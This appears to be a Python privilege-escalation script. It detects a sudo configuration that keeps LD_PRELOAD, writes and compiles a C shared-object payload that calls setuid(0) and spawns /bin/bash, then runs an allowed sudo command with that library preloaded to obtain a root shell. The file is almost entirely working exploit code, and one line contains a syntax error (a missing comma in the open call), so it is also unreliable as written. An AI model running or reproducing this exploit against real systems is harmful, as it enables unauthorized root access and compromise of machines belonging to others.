import os
import re
import subprocess as sub
from rich import box
import Utils.output_handler as oh

EXPLOIT_SCRIPT = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void inject() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
"""

def compile_exploit() -> bool:
    result = sub.run(
        ["gcc", "-fPIC", "-shared", "-o", "/tmp/be_root.so", "/tmp/be_root.c"],
        text=True,
        capture_output=True,
    )

    if result.returncode != 0:
        oh.output_handler(
            with_panel=True,
            message=f"[bold red][!] Compilation failed[/bold red]\n[dim]{result.stderr}[/dim]",
            title="Error",
            box=box.ROUNDED,
            border_style="bold red",
        )

        return False

    oh.output_handler(message="[green][+][/green] Exploit compiled successfully.")
    return True


def run_exploit(cmd_allowed: str) -> None:

    oh.output_handler(is_error=not bool(cmd_allowed),message="Cmd allowed arg is missing")

    run_exploit_cmd = f"sudo LD_PRELOAD=/tmp/be_root.so {cmd_allowed}"

    oh.output_handler(
        with_panel=True,
        message=f"[cyan][~][/cyan] Running command:\n[dim]{run_exploit_cmd}[/dim]",
        title="Running",
        box=box.ROUNDED,
        border_style="cyan",
    )

    if compile_exploit():
        sub.call(run_exploit_cmd, shell=True)
    else:
        oh.output_handler(is_error=True,message="Unable to escalate privileges.")

def find_flag() -> tuple:
    output = sub.run("sudo -l", text=True, capture_output=True, shell=True).stdout
    flag_found = bool(re.search(r"env_keep\s*\+?=\s*LD_PRELOAD", output, re.IGNORECASE))
    
    # print(output.splitlines())
    
    cmd = ""
    for line in output.splitlines():
        all_cmd_allowed = "ALL" in line.strip().split(" ")[-1]

        if "NOPASSWD" in line or (all_cmd_allowed and "LD_PRELOAD" in output):
            parts = line.split("NOPASSWD:")[-1].strip()
            cmd = all_cmd_allowed and "/usr/bin/bash" or parts.split(" ")[-1] if parts else ""
            break

    return (flag_found, cmd)


def create_exploit(text: str) -> None:
    oh.output_handler(is_error= not bool(text), message="Text for file creation is missing")

    be_root_path = "/tmp/be_root.c"

    if os.path.exists(be_root_path):
        oh.output_handler(message=f"This file {be_root_path} already exists make sure to delete it")
        return

    with open(be_root_path "w", encoding="utf-8") as file:
        file.write(text)

    oh.output_handler(message=f"[green][+][/green] C exploit written to [dim]/tmp/be_root.c[/dim]")


def be_root() -> None:
    try:
        flag_exist, vuln_exec = find_flag()
        # print(find_flag())

        if flag_exist:
            oh.output_handler(
                with_panel=True,
                message=f"[bold green][+][/bold green] LD_PRELOAD is allowed via sudo!",
                title="Privilege Escalation",
                border_style="green",
                box=box.DOUBLE,
            )

            oh.output_handler(
                message=f"[yellow]Executable found:[/yellow] [dim]{vuln_exec or 'Not Found'}[/dim]"
            )

            if vuln_exec:
                create_exploit(EXPLOIT_SCRIPT)
                run_exploit(vuln_exec)
            else:
                oh.output_handler(is_error=True,message="No suitable binary found to exploit.")
        else:
            oh.output_handler(is_error=True,message="Unable to escalate privileges.")

    except Exception as e:
        oh.output_handler(
            with_panel=True,
            message=f"[bold red][!] Unexpected error[/bold red]\n[dim]{str(e)}[/dim]",
            title="Crash",
            border_style="red",
            box=box.ROUNDED,
        )
        
be_root()